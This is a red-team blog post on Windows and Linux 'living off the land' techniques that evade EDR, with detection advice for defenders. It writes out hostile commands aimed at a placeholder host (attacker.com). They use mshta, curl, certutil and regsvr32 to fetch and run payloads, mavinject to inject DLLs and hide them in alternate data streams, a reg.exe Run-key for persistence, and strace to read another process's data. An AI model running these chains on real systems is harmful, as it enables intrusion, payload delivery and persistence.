---
layout: post
title: "Living Off the Land in 2026: The Techniques EDR Still Misses"
date: 2026-05-25
categories: [red-team, tricks, evasion]
tags: [lolbins, edr, red-team, windows, linux, io-uring, mavinject, living-off-the-land, ebpf]
excerpt: "79% of attacks this year use zero custom malware. Here's what's actually being used, how it works under the hood, and why your EDR probably doesn't see it."
---

The 2025 CrowdStrike Global Threat Report has a number that should make every blue teamer uncomfortable: 79% of detected attacks involved no malware at all. No custom dropper, no staged payload, nothing with a signature to catch. Just Windows and Linux tools doing exactly what they're designed to do, pointed in the wrong direction.

This is where offensive security actually lives in 2026. If you're writing custom malware and dropping it to disk, you're working harder than necessary and creating way more detection surface than the job requires. The genuinely effective techniques live inside tools the OS already trusts.

Here's what's actually being used, how it works, and what real detection requires.

## MAVInject.exe: Microsoft's Gift to Red Teams

`mavinject.exe` ships with every Windows installation as part of Microsoft Application Virtualization. Its intended purpose is injecting helper DLLs into App-V virtualized processes. In offensive operations it becomes arbitrary code injection into any running process via a single command:

```cmd
C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING C:\path\to\payload.dll
```

Point it at a process ID, give it a DLL path, and mavinject calls `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` under a Microsoft-signed process name. Most EDRs whitelist this binary because it's a legitimate system component. The DLL loads into the target process. No custom injection code needed.

The variant that's particularly hard to catch: DLLs hidden in NTFS Alternate Data Streams.

```cmd
REM Hide payload in ADS
type payload.dll > C:\Windows\Temp\legit.log:hidden.dll

REM Inject from ADS path
mavinject.exe <PID> /INJECTRUNNING C:\Windows\Temp\legit.log:hidden.dll
```

In Explorer, `legit.log` looks like a plain log file. The DLL is invisible to directory listings. Seeing it requires `dir /r` or explicit ADS tooling.

APT groups including Earth Preta and Lazarus have been caught using this in real campaigns. It's MITRE ATT&CK T1218.013. Worth checking whether your detection coverage for that technique ID is actually implemented or just listed as covered.

**What detection actually requires:** Sysmon or Event ID 4688 with full command-line logging, specifically watching for `mavinject.exe` with `/INJECTRUNNING` in the arguments. Behavioral correlation that flags `mavinject.exe` spawning `OpenProcess` + `WriteProcessMemory` API call sequences works too, but most deployments aren't configured this tight.

## The Kill Chain That Still Slips Through

This sequence has been observed in real attacks against enterprise environments and still makes it past most corporate EDR stacks:

```batch
forfiles /c "cmd /c mshta http://attacker.com/stage1.hta"
```

`forfiles.exe` is a batch job utility signed by Microsoft. It spawns `cmd.exe`, which spawns `mshta.exe`, which fetches and executes an HTML Application from a remote URL. `mshta` is also signed by Microsoft. The initial chain looks like: trusted binary spawns cmd spawns trusted binary. No obvious red flag if you're not watching parent-child process trees.

From the `mshta` stage, drop and extract the actual payload:

```cmd
curl.exe -o C:\Users\Public\update.cab https://attacker.com/payload.cab
tar.exe -xf C:\Users\Public\update.cab -C C:\Users\Public\
```

`curl.exe` shipped with Windows starting in 2019. `tar.exe` arrived in 2018. Detection coverage for both is still immature compared to classics like `certutil` and `regsvr32`, because for years these binaries simply didn't exist on Windows and nobody built mature detections for them. `curl.exe` to an external IP is suspicious in isolation. `curl.exe` spawned from `mshta` spawned from `forfiles` is far more suspicious, but catching the chain requires process ancestry tracking across the full execution tree.

Then persistence via a binary that also gets relatively little scrutiny:

```cmd
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\Users\Public\stage2.exe" /f
```

`reg.exe` is Microsoft-signed. Adding a Run key is normal Windows administration. Flagging this requires behavioral baselining, not signatures.

## Linux: io_uring Makes EDR Blind

On the Linux side, the most important development in the last year is `io_uring` as an EDR bypass primitive, demonstrated most clearly by RingReaper and the "Curing" proof-of-concept rootkit.

Linux EDRs hook syscalls. They watch `open()`, `connect()`, `read()`, `write()`, `execve()`. Hooks trigger, events get logged, the EDR decides if something is malicious. This model has worked because attackers make those syscalls.

`io_uring` breaks that assumption. Merged in kernel 5.1, it's an async I/O interface where instead of making individual syscalls for each operation, userspace drops requests into a shared ring buffer and the kernel processes them asynchronously. The actual I/O happens inside kernel context, without the userspace-to-kernel transitions that EDR hooks catch. From the EDR's perspective, almost nothing happened. A single `io_uring_enter()` call submitted a batch of file opens, network connections, and reads that the kernel silently executed.

RingReaper uses this to exfiltrate data, open connections, and read files with dramatically reduced syscall visibility. The "Curing" proof-of-concept runs entirely through io_uring operations and was tested against Falco, Microsoft Defender for Linux, and others. It evaded all of them in published test runs.

The fix requires EDR vendors to instrument `io_uring_enter` at the kernel level, not just the individual syscall paths that io_uring bypasses. Most haven't gotten there yet.

**Immediate blue team actions:** Check whether your Falco ruleset covers `io_uring_enter`. Most don't by default. Audit which processes call `io_uring_enter` and how often. A process suddenly doing bulk I/O through io_uring with no prior history is worth investigating. For high-security environments, restrict io_uring via seccomp policy or set `/proc/sys/kernel/io_uring_disabled` to 1 (available in recent kernels).

## eBPF: The Tool That Goes Both Ways

eBPF gets discussed as a defense technology constantly. It's how Falco works, how most modern Linux observability works. The same capabilities that make it great for monitoring make it interesting for attackers with the right privileges.

eBPF programs can intercept syscalls, modify return values, hide network connections, and conceal processes from standard Linux tools. TripleCross (2022) demonstrated syscall hooking via eBPF to hide malicious activity. Boopkit showed network backdooring through eBPF packet filtering. The process hiding pattern: hook `getdents64` with an eBPF program that filters specific entries from directory results, and `ls`, `ps`, and `/proc` enumeration silently skip your hidden processes and files.

The practical constraint: most eBPF attack techniques require root or `CAP_BPF`. That makes this post-exploitation, not initial access. But after you've used Dirty Frag or CVE-2026-46333 to get root, eBPF-based persistence is genuinely difficult to detect without purpose-built tooling.

**Detection:** Audit BPF program loads regularly:

```bash
# List all loaded eBPF programs
bpftool prog list

# Check for programs attached to syscall entry points
bpftool prog list | grep kprobe | grep sys_enter
```

Programs attached to syscall hooks that weren't placed there by your known security tools (Falco, etc.) are worth investigating. Cross-reference with your deployment records.

## Quick Reference: LOLBin Techniques Worth Knowing

For reference — all of these are on the [LOLBAS Project](https://lolbas-project.github.io/):

```cmd
REM Download via certutil (classic, flagged everywhere now)
certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe

REM Download via curl (less mature detections)
curl.exe -o payload.exe http://attacker.com/payload.exe

REM Script execution via mshta (bypasses script restrictions)
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""powershell.exe"")(window.close)")

REM DLL execution via regsvr32 (Squiblydoo, increasingly caught)
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

REM Process injection via mavinject (low detection coverage)
mavinject.exe <PID> /INJECTRUNNING C:\path\to\payload.dll
```

On Linux, `strace` attached to a privileged process can sometimes read file contents through its output — worth knowing for local access scenarios:

```bash
strace -e trace=read -p <pid_of_privileged_process> 2>&1 | grep -A1 "read("
```

## The pattern underneath all of this

Every technique here has the same shape: use something legitimate, abuse its designed functionality, stay below the detection threshold of tools built for a different threat model.

The defense answer isn't more signatures. It's behavioral baselining, parent-child process chain analysis, and monitoring things that haven't traditionally been monitored: `io_uring_enter`, NTFS ADS paths, BPF program loads, and the specific argument combinations that turn legitimate admin tools into attack chains. Most organizations aren't doing this yet. Most will find out the hard way.

---

*References: [RingReaper analysis](https://cybersecuritynews.com/ringreaper-edr-evasion/), [ARMO io_uring research](https://www.infoq.com/news/2025/09/linux-security-rootkit/), [MITRE ATT&CK T1218.013](https://attack.mitre.org/techniques/T1218/013/), [LOLBAS Project](https://lolbas-project.github.io/), [Hive Security 2026](https://hivesecurity.gitlab.io/blog/lolbins-living-off-the-land-windows-2026/)*
